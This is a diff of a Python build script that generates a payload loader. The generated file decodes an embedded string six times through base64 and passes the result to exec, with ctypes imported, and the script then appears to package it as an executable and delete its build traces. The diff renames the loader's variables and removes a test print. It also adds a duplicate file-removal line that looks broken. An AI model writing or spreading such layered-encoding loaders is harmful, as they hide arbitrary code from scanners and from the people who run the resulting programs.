@@ -1,4 +1,4 @@
-# 2023-06-24 ffctf
+# 2023-07-25 f0ing
 import base64
 import ctypes
 import os
@@ -78,14 +78,12 @@ file.write("""
 import base64
 import ctypes
 
-fffff=0
-ffffff=\""""'' +Code+ '' """\"
-for fffff in range(6):
-    ffffff=base64.b64decode(ffffff)
-fasdas=ffffff
-ffff=\"""print("1")""\"
-exec(ffff)
-exec(ffffff)
+zzzzz=0
+zzzzzz=\""""'' +Code+ '' """\"
+for zzzzz in range(6):
+    zzzzzz=base64.b64decode(zzzzzz)
+fasdas=zzzzzz
+exec(zzzzzz)
 """)
 
 file.close()
@@ -108,4 +106,5 @@ except:
 # 删除 build 文件夹和.spec文件
 shutil.rmtree("./build")
 os.remove("./ffctf.spec")
+os.remove("./ffctf.py")
 os.remove("./ffctf.py")
